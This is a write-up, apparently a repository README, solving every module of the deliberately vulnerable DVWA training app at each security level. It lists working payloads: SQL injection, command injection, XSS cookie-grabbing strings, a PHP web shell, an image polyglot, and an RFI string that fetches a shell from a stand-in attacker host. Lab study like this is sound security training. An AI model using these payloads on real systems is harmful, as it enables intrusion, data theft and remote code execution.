# DVWA Solutions: Complete Writeups for All Security Levels

This repository provides a complete, structured guide to solving every module in Damn Vulnerable Web Application (DVWA). It covers Low, Medium, High, and Impossible levels for SQL Injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), File Inclusion, File Upload, Command Injection, Brute Force, and more. Each solution includes the vulnerability cause, the exploitation process, and the exact payload used.

## Table of Contents

- [Brute Force](#brute-force)
- [Command Injection](#command-injection)
- [CSRF](#csrf)
- [File Inclusion](#file-inclusion)
- [File Upload](#file-upload)
- [SQL Injection](#sql-injection)
- [SQL Injection (Blind)](#sql-injection-blind)
- [Weak Session IDs](#weak-session-ids)
- [XSS (DOM)](#xss-dom)
- [XSS (Reflected)](#xss-reflected)
- [XSS (Stored)](#xss-stored)
- [CSP Bypass](#csp-bypass)
- [JavaScript Attacks](#javascript-attacks)
- [Authorisation Bypass](#authorisation-bypass)

## Brute Force

- Vuln: Brute Force
- Level: Low
    - Cause: No rate limiting, lockout, or CSRF protection. Credentials are sent via GET.
    - Process: Capture the login request in Burp Suite and send it to Intruder. Set the password parameter as the payload position and run a wordlist such as rockyou.txt.
    - Payload: `username=admin&password=^PASS^&Login=Login` (the password is `password`).
- Level: Medium
    - Cause: A `sleep(2)` delay is added on failed login attempts to slow down automation.
    - Process: The same Burp Intruder attack from Low works. The delay only slows the process, it does not prevent it.
    - Payload: Same as Low.
- Level: High
    - Cause: Adds an anti-CSRF `user_token` that changes on every request.
    - Process: Use a Burp Macro or a script to first fetch the page, extract the `user_token`, and then use it in the subsequent login request. Alternatively, use Burp Intruder's Recursive Grep feature.
    - Payload: `username=admin&password=^PASS^&user_token=^TOKEN^&Login=Login`.
- Level: Impossible
    - Cause: Implements account lockout after a few failed attempts, randomized delays, and CSRF tokens.
    - Process: No known bypass. The defense is effective.

## Command Injection

- Vuln: Command Injection
- Level: Low
    - Cause: User input is passed directly to `shell_exec()` without any validation.
    - Process: Use a command separator such as `;`, `&&`, or `|` to chain a second command.
    - Payload: `127.0.0.1; whoami` or `127.0.0.1 | whoami`.
- Level: Medium
    - Cause: A basic blacklist removes `&&` and `;` only. It fails to block other separators.
    - Process: Use a pipe (`|`) or a single ampersand (`&`), which are not on the blacklist.
    - Payload: `127.0.0.1 | whoami` or `127.0.0.1 & whoami`.
- Level: High
    - Cause: An extended blacklist removes `||`, `&`, `;`, and `| ` (pipe followed by a space). The flaw is that it only blocks the pipe when followed by a space.
    - Process: Use a pipe (`|`) without a trailing space to bypass the filter.
    - Payload: `127.0.0.1|whoami`.
- Level: Impossible
    - Cause: Uses a strict whitelist, validating that the input is a proper IPv4 address before execution.
    - Process: No known bypass. Input must conform to `filter_var($target, FILTER_VALIDATE_IP)`.

## CSRF

- Vuln: Cross-Site Request Forgery (CSRF)
- Level: Low
    - Cause: The password change is a GET request with no token or referer check.
    - Process: Trick a logged-in victim into loading a URL that changes their password. Use a hidden image tag.
    - Payload: `<img src="http://dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">`.
- Level: Medium
    - Cause: The application checks if the server's hostname appears in the `Referer` header. The check is flawed because it only looks for a substring.
    - Process: Host your attack page on a URL that contains the DVWA hostname, or omit the Referer header.
    - Payload: Use curl or Burp to send a request with a crafted Referer header: `Referer: http://localhost/anything`.
- Level: High
    - Cause: A per-session anti-CSRF token (`user_token`) is required.
    - Process: Chain with an XSS vulnerability on the same origin. The XSS payload fetches the password change page, extracts the token, and then submits the change request.
    - Payload: A JavaScript payload that reads the token and constructs a fetch request.
- Level: Impossible
    - Cause: Requires the user to enter their current password (`password_current`) to change it.
    - Process: No known bypass. The attacker does not know the victim's current password, so the forged request will fail.

## File Inclusion

- Vuln: File Inclusion (LFI and RFI)
- Level: Low
    - Cause: No validation on the `page` parameter.
    - Process: Use path traversal to read local files (LFI) or include a remote file (RFI) if `allow_url_include` is on.
    - Payload: `?page=../../../../etc/passwd` or `?page=http://attacker.com/shell.php`.
- Level: Medium
    - Cause: A `str_replace` filter removes `../` and `http://`, but it is a single-pass filter.
    - Process: Use double-writing to bypass the traversal filter, or use a PHP wrapper that is not blocked.
    - Payload: `?page=....//....//....//etc/passwd` or `?page=php://filter/convert.base64-encode/resource=index.php`.
- Level: High
    - Cause: Uses `fnmatch("file*", $file)` to allow only filenames starting with "file". It fails to block the `file://` wrapper.
    - Process: Use the `file://` protocol wrapper with an absolute path.
    - Payload: `?page=file:///etc/passwd`.
- Level: Impossible
    - Cause: A strict allowlist permits only four specific filenames (`include.php`, `file1.php`, `file2.php`, `file3.php`).
    - Process: No known bypass. The input cannot be transformed into an allowed filename.

## File Upload

- Vuln: File Upload
- Level: Low
    - Cause: No validation on file extension or content.
    - Process: Upload a PHP web shell directly.
    - Payload: `shell.php` containing `<?php system($_GET['cmd']); ?>`. Access it at `/hackable/uploads/shell.php?cmd=id`.
- Level: Medium
    - Cause: Validates the client-controlled `Content-Type` header, only allowing `image/jpeg` or `image/png`.
    - Process: Intercept the upload request in Burp Suite and change the `Content-Type` to `image/jpeg` while keeping the `.php` extension.
    - Payload: The same `shell.php` file, with the spoofed header.
- Level: High
    - Cause: Validates the file extension (jpg, jpeg, png) and uses `getimagesize()` to confirm the file is a valid image.
    - Process: Create a polyglot file (a valid image with embedded PHP code) using a tool such as exiftool. The file passes all checks. Execution requires chaining with an LFI vulnerability to include the image file.
    - Payload: `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`, then upload the image and include it via an LFI.
- Level: Impossible
    - Cause: After validation, the image is re-encoded using GD library functions, which strips all metadata and embedded code. The file is also renamed to a random hash.
    - Process: No known bypass. The destructive re-encoding process neutralizes any payload.

## SQL Injection

- Vuln: SQL Injection
- Level: Low
    - Cause: User input is concatenated directly into the query without sanitization.
    - Process: Break out of the string context and use a `UNION SELECT` to extract data from other tables.
    - Payload: `' UNION SELECT user, password FROM users #`.
- Level: Medium
    - Cause: The input is restricted to a dropdown menu, and `mysqli_real_escape_string()` is applied. However, the query uses a numeric `id`, so quotes are not required for injection.
    - Process: Intercept the request in Burp Suite to bypass the UI restriction. Use a numeric payload without quotes.
    - Payload: `0 UNION SELECT user, password FROM users#`.
- Level: High
    - Cause: The input is taken from a session variable (`$_SESSION['id']`), and the query appends `LIMIT 1`.
    - Process: Use the Click here to change your ID page to store a payload in your session. Comment out the `LIMIT 1` clause to retrieve all rows.
    - Payload: `' UNION SELECT user, password FROM users #` (the `#` comments out `LIMIT 1`).
- Level: Impossible
    - Cause: Uses prepared statements (parameterized queries). User input is bound as data, not executable code.
    - Process: No known bypass.

## SQL Injection (Blind)

- Vuln: SQL Injection (Blind)
- Level: Low
    - Cause: The application returns a different response ("User ID exists in the database") based on whether a condition is true or false. There are no filters.
    - Process: Ask true/false questions to infer data character by character.
    - Payload: `1' AND 1=1#` (true, user exists) and `1' AND 1=2#` (false, user does not exist). To extract data: `1' AND SUBSTRING(user(),1,1)='a'#`.
- Level: Medium
    - Cause: Similar to Low, but with a `sleep()` delay and some input filtering.
    - Process: The same boolean-based technique applies. The delay slows down automation but does not prevent it.
    - Payload: Same as Low.
- Level: High
    - Cause: The input is taken from a session variable, and the query uses `LIMIT 1`. The response is different (for example, a generic "User ID exists" message).
    - Process: Use the session input page to set the payload. The boolean-based technique still works.
    - Payload: Similar to the regular SQL Injection High level, adapted for blind extraction.
- Level: Impossible
    - Cause: Uses prepared statements and returns a generic response for all queries, preventing inference.
    - Process: No known bypass.

## Weak Session IDs

- Vuln: Weak Session IDs
- Level: Low
    - Cause: The `dvwaSession` cookie is a simple sequential integer that increments by one each time.
    - Process: Click Generate and observe the cookie value in your browser's developer tools. You can predict the IDs of other users by incrementing the value.
    - Payload: Cookie value `dvwaSession=2`, then `dvwaSession=3`, and so on.
- Level: Medium
    - Cause: The cookie value is set to the current Unix timestamp (`time()`).
    - Process: The value is predictable. You can generate valid tokens by using the current time or a time close to when the target user generated their ID.
    - Payload: Cookie value `dvwaSession=1678886400` (example timestamp).
- Level: High
    - Cause: The value is an MD5 hash of a predictable value (such as a timestamp or a sequential number).
    - Process: Analyze the JavaScript to understand the generation logic (for example, MD5 of a timestamp). Replicate the logic to predict valid session IDs.
    - Payload: You must reverse-engineer the client-side code to calculate the MD5 hash.
- Level: Impossible
    - Cause: Uses a cryptographically secure random value (for example, sha1 of a random number) for the session ID.
    - Process: No known bypass. The value is not predictable.

## XSS (DOM)

- Vuln: DOM-based Cross-Site Scripting (XSS)
- Level: Low
    - Cause: The `default` parameter is written directly into the DOM using `document.write()` without sanitization.
    - Process: Inject a standard script tag.
    - Payload: `?default=<script>alert(document.cookie)</script>`.
- Level: Medium
    - Cause: The filter blocks the string `<script`. It does not block other HTML tags that can execute JavaScript.
    - Process: Use an event handler with an image tag. The payload must first close the existing `<option>` tag.
    - Payload: `?default=</option></select><img src=x onerror=alert(document.cookie)>`.
- Level: High
    - Cause: A server-side whitelist only allows specific language values (English, French, and so on). The bypass exploits the fact that the URL fragment (`#`) is not sent to the server but is processed by client-side JavaScript.
    - Process: Inject the payload after a valid language value using the `#` anchor.
    - Payload: `?default=English#<script>alert(document.cookie)</script>`.
- Level: Impossible
    - Cause: The application does not write user input to dangerous DOM sinks such as `innerHTML`. It uses safe properties such as `textContent`.
    - Process: No known bypass.

## XSS (Reflected)

- Vuln: Reflected Cross-Site Scripting (XSS)
- Level: Low
    - Cause: The `name` parameter is echoed directly into the HTML response without sanitization.
    - Process: Inject a standard script tag.
    - Payload: `<script>alert(document.cookie)</script>`.
- Level: Medium
    - Cause: A case-sensitive `str_replace` filter removes the exact string `<script>`.
    - Process: Use an image tag with an event handler, or use mixed case.
    - Payload: `<img src=x onerror=alert(document.cookie)>` or `<ScRiPt>alert(1)</ScRiPt>`.
- Level: High
    - Cause: A case-insensitive regex filter (`preg_replace`) blocks any tag containing the sequence of letters forming "script".
    - Process: Use an HTML tag that does not contain the blacklisted sequence, such as an image tag.
    - Payload: `<img src=x onerror=alert(document.cookie)>`.
- Level: Impossible
    - Cause: The application uses `htmlspecialchars()` to encode all output, rendering the payload as inert text.
    - Process: No known bypass.

## XSS (Stored)

- Vuln: Stored Cross-Site Scripting (XSS)
- Level: Low
    - Cause: No HTML sanitization on input. The payload is stored in the database and executed on every page view.
    - Process: Submit a script tag in the Name or Message field.
    - Payload: `<script>alert("XSS")</script>`.
- Level: Medium
    - Cause: The Message field is sanitized, but the Name field only uses a case-sensitive `str_replace` to remove `<script>`.
    - Process: Inject into the Name field using mixed case or an event handler.
    - Payload: `<ScRiPt>alert(1)</ScRiPt>` or `<img src=x onerror=alert(1)>`.
- Level: High
    - Cause: The Name field uses a case-insensitive regex blacklist to block "script".
    - Process: Use an event handler payload that does not contain the blacklisted keyword.
    - Payload: `<img src=x onerror=alert(1)>`.
- Level: Impossible
    - Cause: `htmlspecialchars()` is applied to the output before rendering, neutralizing the payload.
    - Process: No known bypass.

## CSP Bypass

- Vuln: Content Security Policy (CSP) Bypass
- Level: Low
    - Cause: The CSP is too permissive, allowing scripts from many external domains (for example, digi.ninja).
    - Process: Host a malicious JavaScript file on one of the allowed domains.
    - Payload: `<script src="https://digi.ninja/dvwa/cookie.js"></script>`.
- Level: Medium
    - Cause: The CSP uses a static, predictable nonce (`TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=`). It also allows `'unsafe-inline'`.
    - Process: Read the nonce from the page source and use it to execute an inline script.
    - Payload: `<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>`.
- Level: High
    - Cause: The CSP is strict (`'self'` only), but it allows a JSONP endpoint (`jsonp.php`) that uses a `callback` parameter.
    - Process: Intercept the request to the JSONP endpoint and change the `callback` parameter to execute your JavaScript.
    - Payload: Change `?callback=solveSum` to `?callback=alert(document.cookie)` in the request.
- Level: Impossible
    - Cause: Uses a hardcoded JSONP callback and a strict CSP, preventing bypasses.
    - Process: No known bypass.

## JavaScript Attacks

- Vuln: Client-Side Logic Manipulation
- Level: Low
    - Cause: The token is generated by simply reversing the phrase. The logic is visible in the page source.
    - Process: Enter the phrase `success` and manually set the token to its reverse.
    - Payload: Phrase: `success`, Token: `sseccus`.
- Level: Medium
    - Cause: The logic is moved to an external file (`medium.js`), but it is still accessible. The token wraps the reversed phrase in `XX`.
    - Process: Analyze `medium.js`, then manually set the token.
    - Payload: Phrase: `success`, Token: `XXsseccusXX`.
- Level: High
    - Cause: The JavaScript is obfuscated. The token generation involves reversing the string and applying SHA-256 hashing.
    - Process: Use the browser's console to call the token generation function directly, or deobfuscate the script to replicate the logic.
    - Payload: Type `generate_token()` in the console after entering `success` to get the correct token.
- Level: Impossible
    - Cause: All token generation and validation is done on the server.
    - Process: No known bypass. Simply submit the phrase.

## Authorisation Bypass

- Vuln: Authorisation Bypass
- Level: Low
    - Cause: The page has no access controls. Any authenticated user can access it.
    - Process: Log in as a non-admin user (for example, `gordonb`) and navigate directly to the protected URL.
    - Payload: `http://localhost/DVWA/vulnerabilities/authbypass/`.
- Level: Medium
    - Cause: The main page checks if the user is admin, but the underlying API endpoints (`change_user_details.php`) do not.
    - Process: Use a non-admin session to make a direct POST request to the API endpoint. Add a Referer header to mimic the admin request.
    - Payload: `curl -X POST "http://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php" -b "PHPSESSID=<non_admin_id>" -H "Referer: http://localhost/DVWA/index.php" -H "Content-Type: application/json" -d '{"id": 5, "first_name": "Bob", "surname": "Smith"}'`.
- Level: High
    - Cause: The same authorisation flaw as Medium exists at this level.
    - Process: The same API-based exploit from Medium still works at High.
    - Payload: Same as Medium.
- Level: Impossible
    - Cause: Proper authorisation checks are enforced on all sensitive endpoints.
    - Process: No known bypass.
